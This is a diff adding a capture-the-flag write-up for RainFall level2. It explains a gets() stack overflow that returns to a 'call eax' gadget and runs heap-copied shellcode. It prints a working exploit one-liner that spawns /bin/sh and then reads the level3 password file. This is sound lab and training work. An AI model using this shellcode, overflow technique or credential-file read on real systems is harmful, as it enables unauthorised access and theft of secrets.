@@ -1,0 +1,26 @@
+# level2 → level3
+
+`p` uses `gets` on a 76-byte stack buffer. The saved return address is 80
+bytes from its start. A direct return into the stack is rejected when the
+saved address has the `0xb0000000` bits set. After the check, `strdup`
+copies our input onto the VM's executable heap and leaves the heap pointer
+in `eax`. Address `0x080484cf` contains `call eax`; returning there executes
+the copied shellcode. This works on the original VM; heap execution depends
+on its old 32-bit process settings.
+
+From the level2 account on the RainFall VM:
+
+```sh
+(
+  python2.7 -c 'import struct,sys
+sc="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
+sys.stdout.write(sc.ljust(80,"\x90") + struct.pack("<I",0x080484cf) + "\n")'
+  cat
+) | ./level2
+id
+cat /home/user/level3/.pass
+```
+
+In GDB, `disassemble p` shows the buffer at `ebp-0x4c`, the return-address
+mask check, and `strdup`; `x/i 0x080484cf` shows the `call eax` instruction.
+The `flag` file is the level3 password read from the spawned shell.
